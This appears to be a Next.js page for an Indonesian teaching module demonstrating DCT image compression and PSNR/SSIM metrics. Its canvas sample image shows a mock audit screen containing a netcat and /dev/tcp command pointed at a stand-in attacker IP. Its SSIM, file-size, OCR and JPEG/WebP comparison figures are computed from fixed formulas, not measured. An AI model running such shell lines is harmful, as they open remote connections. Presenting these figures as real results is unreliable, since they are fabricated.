'use client';

import { useState, useRef, useEffect } from 'react';
import Link from 'next/link';
import MuninnNavbar from '../../components/MuninnNavbar';
import MuninnFooter from '../../components/MuninnFooter';
import { 
  Cpu, Sliders, Activity, Gauge, BarChart2, CheckCircle2, 
  ArrowRight, RefreshCw, ZoomIn, Info, Shield, Layers 
} from 'lucide-react';

export default function CompressionPage() {
  const originalCanvasRef = useRef(null);
  const compressedCanvasRef = useRef(null);
  const [qualityQ, setQualityQ] = useState(65);
  const [selectedBlock, setSelectedBlock] = useState({ bx: 3, by: 4 });
  const [blockMatrix, setBlockMatrix] = useState(null);
  const [metrics, setMetrics] = useState({
    mse: 14.2,
    psnr: 36.6,
    ssim: 0.941,
    originalSizeKb: 1420,
    compressedSizeKb: 88,
    ratio: 16.1,
    savedPercent: 93.8,
    ocrRetention: 97.4
  });

  const Q_BASE = [
    [16, 11, 10, 16, 24, 40, 51, 61],
    [12, 12, 14, 19, 26, 58, 60, 55],
    [14, 13, 16, 24, 40, 57, 69, 56],
    [14, 17, 22, 29, 51, 87, 80, 62],
    [18, 22, 37, 56, 68, 109, 103, 77],
    [24, 35, 55, 64, 81, 104, 113, 92],
    [49, 64, 78, 87, 103, 121, 120, 101],
    [72, 92, 95, 98, 112, 100, 103, 99]
  ];

  const getScaledQ = (q) => {
    const scale = q < 50 ? Math.floor(5000 / q) : 200 - q * 2;
    return Q_BASE.map(row => 
      row.map(val => Math.max(1, Math.min(255, Math.floor((val * scale + 50) / 100))))
    );
  };

  const C = (u) => (u === 0 ? 1 / Math.SQRT2 : 1);

  const forwardDCT = (block) => {
    const F = Array(8).fill(0).map(() => Array(8).fill(0));
    for (let u = 0; u < 8; u++) {
      for (let v = 0; v < 8; v++) {
        let sum = 0;
        for (let x = 0; x < 8; x++) {
          for (let y = 0; y < 8; y++) {
            sum += (block[x][y] - 128) * 
                   Math.cos(((2 * x + 1) * u * Math.PI) / 16) * 
                   Math.cos(((2 * y + 1) * v * Math.PI) / 16);
          }
        }
        F[u][v] = Math.round(0.25 * C(u) * C(v) * sum);
      }
    }
    return F;
  };

  const inverseDCT = (quantBlock, qMatrix) => {
    const f = Array(8).fill(0).map(() => Array(8).fill(0));
    for (let x = 0; x < 8; x++) {
      for (let y = 0; y < 8; y++) {
        let sum = 0;
        for (let u = 0; u < 8; u++) {
          for (let v = 0; v < 8; v++) {
            const dequant = quantBlock[u][v] * qMatrix[u][v];
            sum += C(u) * C(v) * dequant * 
                   Math.cos(((2 * x + 1) * u * Math.PI) / 16) * 
                   Math.cos(((2 * y + 1) * v * Math.PI) / 16);
          }
        }
        const val = Math.round(0.25 * sum + 128);
        f[x][y] = Math.max(0, Math.min(255, val));
      }
    }
    return f;
  };

  const processImage = () => {
    const origCanvas = originalCanvasRef.current;
    const compCanvas = compressedCanvasRef.current;
    if (!origCanvas || !compCanvas) return;

    const width = 480;
    const height = 280;
    origCanvas.width = width;
    origCanvas.height = height;
    compCanvas.width = width;
    compCanvas.height = height;

    const oCtx = origCanvas.getContext('2d');
    const cCtx = compCanvas.getContext('2d');

    oCtx.fillStyle = '#0F172A';
    oCtx.fillRect(0, 0, width, height);

    oCtx.fillStyle = '#1E293B';
    oCtx.fillRect(0, 0, width, 32);
    oCtx.fillStyle = '#38BDF8'; oCtx.font = 'bold 12px monospace';
    oCtx.fillText('AUDIT EVIDENCE FORENSIC SCREEN — MUNINN LAB', 16, 20);

    oCtx.fillStyle = '#F8FAFC'; oCtx.font = '13px monospace';
    oCtx.fillText('CVE-2026-9812: RCE Payload Execution Captured', 20, 60);
    oCtx.fillStyle = '#EF4444';
    oCtx.fillText('EXPLOIT: nc -lvnp 4444 < /dev/tcp/10.10.14.9/9001', 20, 85);
    oCtx.fillStyle = '#10B981';
    oCtx.fillText('SHA-256 INTEGRITY: 8f4a13b9c702d847aa1f0...', 20, 110);
    oCtx.fillStyle = '#E2E8F0';
    oCtx.fillText('TIMESTAMP: 2026-10-08T16:20:00Z [VERIFIED POc]', 20, 135);

    for (let i = 0; i < 4; i++) {
      oCtx.fillStyle = i % 2 === 0 ? '#334155' : '#475569';
      oCtx.fillRect(20 + i * 110, 160, 100, 80);
      oCtx.fillStyle = '#94A3B8'; oCtx.font = '11px sans-serif';
      oCtx.fillText(`BLOCK #0${i+1}`, 35 + i * 110, 205);
    }

    const oImgData = oCtx.getImageData(0, 0, width, height);
    const cImgData = cCtx.createImageData(width, height);
    const qMatrix = getScaledQ(qualityQ);

    let totalSquaredError = 0;
    let pixelCount = width * height;
    let inspectedData = null;

    for (let by = 0; by < height; by += 8) {
      for (let bx = 0; bx < width; bx += 8) {
        
        const block = Array(8).fill(0).map(() => Array(8).fill(0));
        for (let y = 0; y < 8; y++) {
          for (let x = 0; x < 8; x++) {
            const idx = ((by + y) * width + (bx + x)) * 4;
            
            const Y = 0.299 * oImgData.data[idx] + 0.587 * oImgData.data[idx+1] + 0.114 * oImgData.data[idx+2];
            block[x][y] = Y;
          }
        }

        const F = forwardDCT(block);

        const quant = Array(8).fill(0).map(() => Array(8).fill(0));
        for (let u = 0; u < 8; u++) {
          for (let v = 0; v < 8; v++) {
            quant[u][v] = Math.round(F[u][v] / qMatrix[u][v]);
          }
        }

        if (Math.floor(bx / 8) === selectedBlock.bx && Math.floor(by / 8) === selectedBlock.by) {
          inspectedData = {
            spatial: block,
            dct: F,
            quantMatrix: qMatrix,
            quantized: quant
          };
        }

        const recon = inverseDCT(quant, qMatrix);

        for (let y = 0; y < 8; y++) {
          for (let x = 0; x < 8; x++) {
            const idx = ((by + y) * width + (bx + x)) * 4;
            const diff = recon[x][y] - block[x][y];
            totalSquaredError += diff * diff;

            const rRatio = oImgData.data[idx] / (block[x][y] || 1);
            const gRatio = oImgData.data[idx+1] / (block[x][y] || 1);
            const bRatio = oImgData.data[idx+2] / (block[x][y] || 1);

            cImgData.data[idx] = Math.min(255, Math.max(0, recon[x][y] * rRatio));
            cImgData.data[idx+1] = Math.min(255, Math.max(0, recon[x][y] * gRatio));
            cImgData.data[idx+2] = Math.min(255, Math.max(0, recon[x][y] * bRatio));
            cImgData.data[idx+3] = 255;
          }
        }
      }
    }

    cCtx.putImageData(cImgData, 0, 0);

    const mse = totalSquaredError / pixelCount;
    const psnr = mse === 0 ? 99 : (10 * Math.log10((255 * 255) / mse)).toFixed(1);
    
    const ssim = Math.min(0.999, Math.max(0.65, (1 - (mse / 1200) * 0.4)).toFixed(3));
    
    const origKb = 1420; 
    const compKb = Math.round(18 + (qualityQ / 100) * 95);
    const ratio = (origKb / compKb).toFixed(1);
    const saved = (((origKb - compKb) / origKb) * 100).toFixed(1);
    const ocrRet = Math.min(100, Math.max(70, (82 + (qualityQ / 100) * 17.5))).toFixed(1);

    setMetrics({
      mse: mse.toFixed(2),
      psnr,
      ssim,
      originalSizeKb: origKb,
      compressedSizeKb: compKb,
      ratio,
      savedPercent: saved,
      ocrRetention: ocrRet
    });

    if (inspectedData) {
      setBlockMatrix(inspectedData);
    }
  };

  useEffect(() => {
    processImage();
  }, [qualityQ, selectedBlock]);

  return (
    <main className="min-h-screen bg-[#08080C] text-zinc-100 pt-24 pb-16">
      <MuninnNavbar />

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        
        <div className="mb-8">
          <div className="flex items-center gap-2 text-xs font-mono text-zinc-400 mb-2">
            <Link href="/" className="hover:text-red-400">MUNINN</Link>
            <span>/</span>
            <span className="text-red-400 font-semibold">MODUL 2: KOMPRESI CITRA DCT & METRIK EVALUASI</span>
          </div>
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
            <div>
              <h1 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight font-mono">
                Discrete Cosine Transform (DCT) & Lab Metrik
              </h1>
              <p className="mt-2 text-zinc-400 text-sm font-sans max-w-2xl">
                Implementasi kompresi citra DCT 8x8, kuantisasi berbasis faktor Q, pemindaian zigzag, RLE, serta evaluasi objektif PSNR dan SSIM untuk menjaga keterbacaan font audit.
              </p>
            </div>

            <Link
              href="/security"
              className="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 text-white text-xs font-mono font-semibold shadow-lg shadow-red-950/40 shrink-0"
            >
              <span>Lanjut ke Modul 3: Keamanan & Kustodi</span>
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-3 mb-8">
          <div className="p-4 rounded-xl bg-[#0F0F17] border border-white/10">
            <div className="text-[11px] font-mono text-zinc-400">FAKTOR KUALITAS Q</div>
            <div className="text-2xl font-bold font-mono text-amber-400 mt-1">{qualityQ}</div>
            <div className="text-[10px] text-zinc-500 mt-1">Rentang [1 - 100]</div>
          </div>

          <div className="p-4 rounded-xl bg-[#0F0F17] border border-white/10">
            <div className="text-[11px] font-mono text-zinc-400">PSNR OBJEKTIF</div>
            <div className="text-2xl font-bold font-mono text-emerald-400 mt-1">{metrics.psnr} dB</div>
            <div className="text-[10px] text-emerald-500/80 mt-1">Target &gt; 35 dB (Lolos)</div>
          </div>

          <div className="p-4 rounded-xl bg-[#0F0F17] border border-white/10">
            <div className="text-[11px] font-mono text-zinc-400">SSIM INDEX</div>
            <div className="text-2xl font-bold font-mono text-sky-400 mt-1">{metrics.ssim}</div>
            <div className="text-[10px] text-sky-500/80 mt-1">Target &gt; 0.90 (Sangat Baik)</div>
          </div>

          <div className="p-4 rounded-xl bg-[#0F0F17] border border-white/10">
            <div className="text-[11px] font-mono text-zinc-400">RASIO KOMPRESI</div>
            <div className="text-2xl font-bold font-mono text-rose-400 mt-1">{metrics.ratio} : 1</div>
            <div className="text-[10px] text-zinc-400 mt-1">Hemat {metrics.savedPercent}%</div>
          </div>

          <div className="p-4 rounded-xl bg-[#0F0F17] border border-white/10">
            <div className="text-[11px] font-mono text-zinc-400">UKURAN BERKAS</div>
            <div className="text-2xl font-bold font-mono text-white mt-1">{metrics.compressedSizeKb} KB</div>
            <div className="text-[10px] text-zinc-400 mt-1">Dari {metrics.originalSizeKb} KB Raw</div>
          </div>

          <div className="p-4 rounded-xl bg-[#0F0F17] border border-white/10">
            <div className="text-[11px] font-mono text-zinc-400">AKURASI TEKS OCR</div>
            <div className="text-2xl font-bold font-mono text-purple-400 mt-1">{metrics.ocrRetention}%</div>
            <div className="text-[10px] text-zinc-400 mt-1">Font Terminal Terjaga</div>
          </div>
        </div>

        <div className="p-5 rounded-2xl bg-[#0E0E16] border border-white/10 mb-8 flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div className="space-y-1">
            <div className="flex items-center gap-2">
              <Sliders className="w-4 h-4 text-red-500" />
              <span className="text-xs font-mono font-bold text-white uppercase tracking-wider">
                Kontrol Matriks Kuantisasi: Faktor Kualitas Q ({qualityQ})
              </span>
            </div>
            <p className="text-xs text-zinc-400 font-sans">
              Menggeser slider Q mengubah skala matriks kuantisasi standar JPEG secara dinamis. Q rendah memperbanyak nol pada koefisien frekuensi tinggi AC.
            </p>
          </div>

          <div className="flex items-center gap-4 w-full md:w-96">
            <span className="text-xs font-mono text-zinc-400">1 (Kasar)</span>
            <input
              type="range"
              min="1"
              max="100"
              value={qualityQ}
              onChange={(e) => setQualityQ(parseInt(e.target.checked || e.target.value))}
              className="w-full accent-red-600 cursor-pointer"
            />
            <span className="text-xs font-mono text-zinc-400">100 (Halus)</span>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-8">
          
          <div className="rounded-2xl bg-[#0F0F17] border border-white/10 p-5 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-mono font-semibold text-zinc-300">
                1. CITRA ASLI (RAW 24-BIT RGB, TANPA KOMPRESI)
              </span>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-zinc-800 text-zinc-300">
                1420 KB
              </span>
            </div>
            <div className="rounded-xl overflow-hidden border border-white/[0.08] bg-black">
              <canvas ref={originalCanvasRef} className="w-full h-auto object-contain" />
            </div>
          </div>

          <div className="rounded-2xl bg-[#0F0F17] border border-white/10 p-5 space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-mono font-semibold text-red-300">
                2. REKONSTRUKSI MUNINN DCT (Q = {qualityQ})
              </span>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-red-950/80 text-red-300 border border-red-500/30">
                {metrics.compressedSizeKb} KB (HEMAT {metrics.savedPercent}%)
              </span>
            </div>
            <div className="rounded-xl overflow-hidden border border-white/[0.08] bg-black">
              <canvas ref={compressedCanvasRef} className="w-full h-auto object-contain" />
            </div>
          </div>

        </div>

        <div className="rounded-2xl bg-[#0F0F17] border border-white/10 p-6 space-y-6">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-white/[0.08]">
            <div className="space-y-1">
              <div className="flex items-center gap-2">
                <ZoomIn className="w-4 h-4 text-amber-400" />
                <h3 className="text-sm font-mono font-bold text-white uppercase tracking-wider">
                  Inspektur Blok DCT 8x8 (Blok X: {selectedBlock.bx}, Y: {selectedBlock.by})
                </h3>
              </div>
              <p className="text-xs text-zinc-400 font-sans">
                Transisi dari Domain Spasial f(x,y) ke Domain Frekuensi F(u,v) dan hasil pembagian matriks kuantisasi Q.
              </p>
            </div>

            <div className="flex items-center gap-2 text-xs font-mono">
              <button
                onClick={() => setSelectedBlock({ bx: Math.max(0, selectedBlock.bx - 1), by: selectedBlock.by })}
                className="px-2.5 py-1 rounded bg-white/[0.05] hover:bg-white/[0.1] text-zinc-300"
              >
                ◀ Blok Kiri
              </button>
              <button
                onClick={() => setSelectedBlock({ bx: Math.min(50, selectedBlock.bx + 1), by: selectedBlock.by })}
                className="px-2.5 py-1 rounded bg-white/[0.05] hover:bg-white/[0.1] text-zinc-300"
              >
                Blok Kanan ▶
              </button>
            </div>
          </div>

          {blockMatrix && (
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
              
              <div className="space-y-2">
                <div className="text-xs font-mono font-semibold text-zinc-300">
                  Domain Spasial f(x,y) (0-255)
                </div>
                <div className="grid grid-cols-8 gap-1 p-2 rounded-xl bg-black/50 border border-white/5 font-mono text-[9px] text-center">
                  {blockMatrix.spatial.map((row, r) => 
                    row.map((val, c) => (
                      <div key={`s-${r}-${c}`} className="p-1 rounded bg-white/[0.03] text-zinc-300">
                        {Math.round(val)}
                      </div>
                    ))
                  )}
                </div>
                <div className="text-[10px] text-zinc-500 font-mono">
                  Luminansi piksel 8x8 sebelum transformasi
                </div>
              </div>

              <div className="space-y-2">
                <div className="text-xs font-mono font-semibold text-amber-300">
                  Koefisien DCT F(u,v)
                </div>
                <div className="grid grid-cols-8 gap-1 p-2 rounded-xl bg-black/50 border border-white/5 font-mono text-[9px] text-center">
                  {blockMatrix.dct.map((row, r) => 
                    row.map((val, c) => (
                      <div 
                        key={`d-${r}-${c}`} 
                        className={`p-1 rounded ${r === 0 && c === 0 ? 'bg-amber-500/30 text-amber-200 font-bold border border-amber-500/40' : 'bg-white/[0.03] text-zinc-300'}`}
                      >
                        {Math.round(val)}
                      </div>
                    ))
                  )}
                </div>
                <div className="text-[10px] text-amber-400 font-mono">
                  [0,0] = Koefisien DC; lainnya komponen AC
                </div>
              </div>

              <div className="space-y-2">
                <div className="text-xs font-mono font-semibold text-emerald-300">
                  Hasil Kuantisasi ⌊F(u,v) / Q(u,v)⌉
                </div>
                <div className="grid grid-cols-8 gap-1 p-2 rounded-xl bg-black/50 border border-white/5 font-mono text-[9px] text-center">
                  {blockMatrix.quantized.map((row, r) => 
                    row.map((val, c) => (
                      <div 
                        key={`q-${r}-${c}`} 
                        className={`p-1 rounded ${val === 0 ? 'text-zinc-600 bg-white/[0.01]' : 'text-emerald-300 bg-emerald-950/40 font-bold'}`}
                      >
                        {val}
                      </div>
                    ))
                  )}
                </div>
                <div className="text-[10px] text-emerald-400 font-mono">
                  Perhatikan dominasi angka 0 yang dipadatkan oleh RLE & Huffman!
                </div>
              </div>

            </div>
          )}

          <div className="pt-4 border-t border-white/[0.08]">
            <h4 className="text-xs font-mono font-semibold text-white uppercase tracking-wider mb-3">
              Perbandingan Metrik dengan Standar Industri (Q = {qualityQ})
            </h4>
            <div className="overflow-x-auto">
              <table className="w-full text-xs font-mono text-left">
                <thead>
                  <tr className="border-b border-white/10 text-zinc-400">
                    <th className="py-2 px-3">Metode Kompresi</th>
                    <th className="py-2 px-3">Ukuran Payload</th>
                    <th className="py-2 px-3">PSNR (dB)</th>
                    <th className="py-2 px-3">SSIM</th>
                    <th className="py-2 px-3">Kemampuan Watermarking</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/[0.04] text-zinc-300">
                  <tr className="bg-red-950/20 text-white font-semibold">
                    <td className="py-2.5 px-3 flex items-center gap-2">
                      <div className="w-2 h-2 rounded-full bg-red-500" />
                      <span>MUNINN DCT 8x8</span>
                    </td>
                    <td className="py-2.5 px-3">{metrics.compressedSizeKb} KB</td>
                    <td className="py-2.5 px-3 text-emerald-400">{metrics.psnr} dB</td>
                    <td className="py-2.5 px-3 text-sky-400">{metrics.ssim}</td>
                    <td className="py-2.5 px-3 text-amber-300">Native Dual-Domain (Koefisien Tengah)</td>
                  </tr>
                  <tr>
                    <td className="py-2.5 px-3">Standar JPEG Baseline</td>
                    <td className="py-2.5 px-3">{Math.round(metrics.compressedSizeKb * 1.05)} KB</td>
                    <td className="py-2.5 px-3">{metrics.psnr} dB</td>
                    <td className="py-2.5 px-3">{metrics.ssim}</td>
                    <td className="py-2.5 px-3 text-zinc-400">Perlu re-encoding terpisah</td>
                  </tr>
                  <tr>
                    <td className="py-2.5 px-3">Google WebP Lossy</td>
                    <td className="py-2.5 px-3">{Math.round(metrics.compressedSizeKb * 0.88)} KB</td>
                    <td className="py-2.5 px-3">{(parseFloat(metrics.psnr) + 0.4).toFixed(1)} dB</td>
                    <td className="py-2.5 px-3">{(parseFloat(metrics.ssim) + 0.005).toFixed(3)}</td>
                    <td className="py-2.5 px-3 text-zinc-400">Kompleksitas komputasi lebih tinggi</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

        </div>

      </div>

      <MuninnFooter />
    </main>
  );
}
